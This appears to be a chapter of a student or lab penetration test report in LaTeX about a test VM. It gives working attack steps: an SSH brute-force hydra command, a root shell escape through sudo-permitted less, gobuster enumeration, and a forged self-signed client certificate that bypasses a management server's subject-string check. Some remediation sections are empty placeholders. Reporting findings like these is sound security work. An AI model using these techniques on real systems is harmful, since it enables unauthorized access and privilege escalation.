\chapter{Results}
In this chapter, the vulnerabilities found during the penetration test are presented in detail. All issues are grouped by their target and contain the following information:
\begin{itemize}
	\item Brief description.
	\item CVSS Base Score -- see \href{https://www.first.org/cvss/user-guide}{\textcolor{blue}{\underline{here}}} for details.
	\item Exploitability -- describes the likelihood of an issue being used against customer's infrastructure.
	\item References to classifications: WASC, OWASP, CWE.
	\item Steps to reproduce.
\end{itemize}

Furthermore, recommendations for remediation are given for each vulnerability found during the penetration test. 
Both "quick win" and long-term solutions are presented as well as some code examples.

\section{Virtual Machine}
\textbf{Server IPv4 address}: 10.1.0.10\\
\textbf{Server IPv6 address}: fd01::a

\subsection{Open Ports}\label{open_ports}
The first step of our penetration test was scanning for open ports on the given virtual machine to get a starting point for 
our investigation. The port scanning was done with \textbf{nmap} on all ports of the VM. The scan had the following results:

\begin{minipage}{\linewidth}
\begin{verbatim}
	$ nmap -A -p 0-65535 10.1.0.10

	Nmap scan report for 10.1.0.10
	Host is up (0.018s latency).
	Not shown: 65533 closed tcp ports (conn-refused)
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
	| ssh-hostkey: 
	|   3072 e9:b7:ab:3a:b8:68:5e:cc:85:f6:00:b3:99:b9:22:ae (RSA)
	|   256 b4:7c:1f:96:22:5a:63:4d:2b:30:db:5f:ef:70:11:bd (ECDSA)
	|_  256 9d:40:34:55:05:70:80:b0:d0:ce:d0:d5:f4:5d:cd:28 (ED25519)
	80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
	|_http-title: Apache2 Debian Default Page: It works
	|_http-server-header: Apache/2.4.51 (Debian)
	20321/tcp open  unknown
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}
\end{minipage}
\\
\\
With this scan we learned the operating system and revealed the open ports of the VM.
The port 22 is open and running the SSH-Service on version OpenSSH 8.4p1 Debian 5.
The VM also runs an Apache2-Server with the version httpd 2.4.51 on port 80.
There is also running an unknown service on open port 20321.
These open ports will be the starting point of our penetration test.   

\subsection{Weak password} \label{ss: issue-1}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & The user bluey uses a weak password and which can be brute-forced using common wordlists. \\
		\hline 
		CVSS Base Score & 9.1 \\
		\hline 
		Exploitablity & High \\
		\hline 
		\multirow{2}{*}{References to classifications} & WASC \\
		\cline{2-2} 
		& OWASP \\
		\hline 
		Affected input & hydra -l bluey -P rockyou.txt -t 4 10.1.0.10 ssh \\
		\hline 
	\end{tabular}
	\caption{Issue \#1: Weak password on Virtual Machine}
	\label{tbl:issue-1}
\end{table}

\subsubsection{Minimal proof of concept}
A curated list of users can be found on the Apache web server \ref{}.
Through the port scan it is reveald the SSH port is open.
Using hydra as a tool to brute-force the password of an user:
\begin{verbatim}
$ hydra -l bluey -P rockyou.txt -t 4 10.1.0.10 ssh
\end{verbatim}

\subsubsection{Proposed solutions} \label{solution: issue-2}
Use passwordless SSH authentication and disable password authentication

\subsection{Privilege Escalation} \label{less_exploit}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & The user bluey is able to read a log file using \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} with root privilege. \\
		\hline 
		CVSS Base Score & 7.3 \\
		\hline 
		Exploitablity & High \\
		\hline 
		References to classifications & A01:2021 - Broken Access Control\\
		\hline 
	\end{tabular}
	\caption{Issue \#2}
	\label{tbl:issue-2}
\end{table}

\subsubsection{Minimal proof of concept}
Using the gained user account in \ref{ss: issue-1} we can look into the \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|etc/sudoers|} file and we find the following line:
\begin{verbatim}
	bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log
\end{verbatim}
This reveals the user bluey has root privileges to use \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} on the \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|/var/log/auth.log|} file. This poses a huge vulnerability because \colorbox{gray}{\lstinline[basicstyle=\ttfamily\color{white}]|less|} allows a user to run commands inside the tool. 
If we execute:
\begin{verbatim}
	!/bin/sh
\end{verbatim}
we start a new shell instance with root privileges since less is running with root privileges.

\subsubsection{Proposed solutions} \label{solution: issue-3}


\section{Apache Web Server}
Apache web server using v.2.4.51\\
Web server is not configured\\
\textbf{Hostname \& Port}: 10.1.0.10:80\\

\subsection{} \label{ss: issue-4}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & Web server is vulnerable and outdated \\
		\hline 
		CVSS Base Score & 7.5 \\
		\hline 
		Exploitablity & Medium \\
		\hline 
		References to classifications & OWASP: A06:2021-Vulnerable and Outdated Components \\
		\hline
	\end{tabular}
	\caption{Issue \#3}
	\label{tbl:issue-3}
\end{table}

\subsubsection{Minimal proof of concept}
The web server is featuring the version 2.4.51 which has the following CVE entry:\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44790}

Basically, the webserver is vulnerable to a buffer overflow, if a request body is well crafted.

\subsubsection{Proposed solutions} \label{solution: issue-5}
Upgrade the web server to newest version.
Since the web server is not configured and in use we recommend to turn it offline as well. This would also mitigate the following finding. 

\subsection{Information Disclosure} \label{ss: issue-4}
\begin{table}[h]
	\centering
	\begin{tabular}{| l | p{10cm} |}
		\hline 
		Description & Web server exposes usernames \\
		\hline 
		CVSS Base Score & 6.5 \\
		\hline 
		Exploitablity & Medium \\
		\hline 
		References to classifications & OWASP: A3:2017-Sensitive Data Exposure \\
		\hline
	\end{tabular}
	\caption{Issue \#4}
	\label{tbl:issue-4}
\end{table}

\subsubsection{Minimal proof of concept}
To find all subdomains of the web server we ran gobuster:

\begin{verbatim}
$ gobuster dir -u 10.1.0.10:80 -w /wordlists/dirbig.txt
\end{verbatim}
\vdots
\begin{verbatim}
===============================================================
//                    (Status: 200) [Size: 10701]
/home                 (Status: 301) [Size: 305] [--> http://10.1.0.10/home/]

===============================================================
\end{verbatim}
\vdots

Opening \url{10.1.0.10:80/home} in the browser reveals three potential usernames:
\begin{itemize}
	\item root
	\item bluey
	\item bingo
\end{itemize}

Each user is the label of a directory and we ran another subdomain enumeration per user:

\begin{verbatim}
	$ gobuster dir -u 10.1.0.10/home -w wordlists/file+dir.txt
\end{verbatim}
\vdots
\begin{verbatim}
	===============================================================
/root                 (Status: 301) [Size: 310] [--> http://10.1.0.10/home/root/]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswds           (Status: 403) [Size: 274]

===============================================================
\end{verbatim}
\vdots

as seen in the output the files that return are forbidden.

\subsubsection{Proposed solutions} \label{solution: issue-4}
Proposed solution to the issue goes here.

\section{Management Server}
The \hyperref[open_ports]{\textcolor{blue}{\underline{initial port scanning}}} revealed an unknown service on port 20321.
After cracking the password of the user "bluey" and logging into the virtual machine, we can look at the running processes.
There are two processes particularly interesting regarding the open port 20321:
\begin{verbatim}
	$ ps aux

	root      233604  0.0  0.4  17044  9560 ?        Ss   14:13   0:00 
	/usr/bin/python3 /opt/mgmtserver/mgmtserver \
		   { "certfile": "/etc/management-server/server.crt", \
		     "keyfile": "/etc/management-server/server.key" }
	
	root      233605  0.0  0.2   6928  4244 ?        S    14:13   0:00 
	/usr/bin/openssl s_server -accept 20321  \
		   -cert /etc/management-server/server.crt \
		   -key /etc/management-server/server.key -naccept 1 -Verify 1
\end{verbatim}
We can see that a SSL/TLS-Server from OpenSSL ist running on port 20321.
From the results above and the certificate and key path we can deduce that the two processes are connected.
It is highly probable that the SSL/TLS-Server is spawned by the python script "mgmtserver".
With the user "bluey" we can not access the mgmtserver directory.
To open the mgmtserver file you need root access. For this we can use the root user obtained with the 
\hyperref[less_exploit]{\textcolor{blue}{\underline{less expoit}}}.
In the code we can see that the certificate is not validated with a root certificate. 
The subject of the client certificate is only compared with another string.
\\
\\
\begin{minipage}{\linewidth}
	\begin{verbatim}
		...
		if self._client_cert == "subject=CN = Management Client Certificate, \
			O = Secure Systems Inc., OU = admin=false":
		...
		elif self._client_cert == "subject=CN = Management Client Certificate, \
			O = Secure Systems Inc., OU = admin=true":
		...
	\end{verbatim}
\end{minipage}
\\
\subsubsection{Minimal proof of concept}
We can easily create a self signed certificate which satisfies this string comparison. Such a certificate can created with the following
OpenSSL command:
\begin{verbatim}
$ openssl req -newkey rsa:4096 \                                              
	  -x509 \
	  -sha256 \
	  -subj "/CN=Management Client Certificate/O=Secure Systems Inc./OU=admin=true" \ 
	  -days 3650 \
	  -nodes \
	  -out example.crt \
	  -keyout example.key
\end{verbatim}
With the certificate which can be created with the above command we can now connect to port 20321. The python script will now compare the subject
of our client certificate with the string in the file and grant root access to the VM. To connect to the port we can use the OpenSSL-Client:
\begin{verbatim}
	$ openssl s_client -connect 10.1.0.10:20321 -cert example.crt -key example.key
\end{verbatim}
\subsubsection{Proposed solutions}
To solve this vulnerability and improve the authentication we recommand to not make a simple string comparison with the client certificate subject
and instead verify the client certificate with a root certificate you own. You can create a self signed certificate and use it as a certificate 
authority. This CA certificate will be used to issue client certificates with which you can connect to your management server.
For authentication you just have to verify the digital signature on the client certificate if it was issued by your root certificate. 

\newpage